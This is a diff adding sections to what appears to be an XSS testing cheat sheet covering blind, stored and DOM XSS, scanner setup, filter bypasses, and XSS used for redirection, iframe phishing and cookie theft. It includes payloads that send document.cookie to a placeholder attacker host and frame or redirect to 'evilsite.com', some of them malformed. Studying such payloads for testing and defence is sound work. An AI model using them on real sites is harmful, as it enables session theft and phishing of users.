@@ -89,6 +89,145 @@ Encoding the Payload using encoding techniques like Base64
 
 Sometimes web application block “(Double quotes) but a payload like ‘-alert(1)-’ can bypass the protection giving Reflected XSS
 
+Blind XSS:
+
+Sometimes in certain areas example in feedback forms or chat bots we do not have an idea if XSS exists or not, in such a case we will create a payload where the server will give us a response
+
+This can be easily done by using XSSHunter where payloads as well as reports can be easily created
+
+Link: https://xsshunter.com/
+
+
+
+Stored XSS:
+
+If a web application stores our payload then such an XSS is called a Stored XSS. Such fields can be found under “My Profile” Section.
+
+
+
+DOM XSS
+
+DOM XSS arises due to the fact that input comes from the source and gets executed in the sink.
+
+
+
+
+
+
+DOM XSS Automated Scanner
+
+Steps:
+
+git clone https://github.com/dwisiswant0/findom-xss.git
+
+git clone https://github.com/GerbenJavado/LinkFinder.git
+
+cd LinkFinder
+
+pip install -r requirements.txt
+
+cd ..
+
+cd findom-xss
+
+nano findom-xss.sh
+
+Change the path of linkfinder
+
+Save and Quit
+
+./findom-xss https://website.com
+
+
+
+XSS Mouse Payloads:
+
+Sometimes when keyboard payloads are blocked, we can perform XSS using mouse payloads as developers fail to protect them from being bypassed. Some of the mouse payloads are onmouseover, onmouseclick etc. A list can be found under resources.
+
+
+
+XSS Polyglots:
+
+Polyglots means someone who knows many languages. Combining it with XSS Payloads, it basically means a payload combination of 2 or more payloads in order to trick the web server and bypass many input checks.
+
+A list of polyglot payloads can be found : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/XSS_Polyglots.txt
+
+
+
+XSS to URL Redirection:
+
+Using an injection point and crafting a specially based payload we can make the victim redirect to an evil website.
+
+The Payload will look something like this: <script>document.href=”https://evilsite.com”</script>
+
+
+
+XSS to Phishing:
+
+Using an injection point and a specially crafted payload of iframe we can trick the user to see a login screen and make the user log in thus phishing the user.
+
+
+
+Payload: <iframe src=”https://evilsite.com” height=”100%” width=”100%”></iframe>
+
+
+
+XSS to Cookie Stealing:
+
+This technique can increase the severity of XSS. A simple payload where the cookie of user will be redirected to the attacker’s web server.The payload can be as follows:
+
+
+
+<script>document.location.href=”attackers.website/cookie=”>+document.cookie</script>
+
+
+
+Where document.cookie will give the victims cookie and document.location.href will send the data to attacker’s web server
+
+
+
+XSS via File Upload:
+
+Some web servers do not check the content of the file while uploading them. In such a scenario an attacker can write the payload inside the file and upload the file on the web application thus leading to XSS.
+
+
+
+Where web servers only upload image files, using an exiftool we can create a new parameter and add our payload in the value option and then upload the image file to web application thus prompting the alert box
+
+
+
+XSS Mitigations:
+
+Input Sanitization
+
+Encode all input characters
+
+Usage of WAF
+
+Filter Input on Arrival
+
+Encode data on output
+
+Use appropriate response headers
+
+Content Security Policy
+
+
+
+ParamSpider:
+
+A tool which can find hidden parameters on a website. The tool can be installed from https://github.com/devanshbatham/ParamSpider
+
+Steps:
+
+$ git clone https://github.com/devanshbatham/ParamSpider
+
+$ cd ParamSpider
+
+$ pip3 install -r requirements.txt
+
+$ python3 paramspider.py --domain hackerone.com
+
 
 
 https://github.com/devanshbatham/ParamSpider
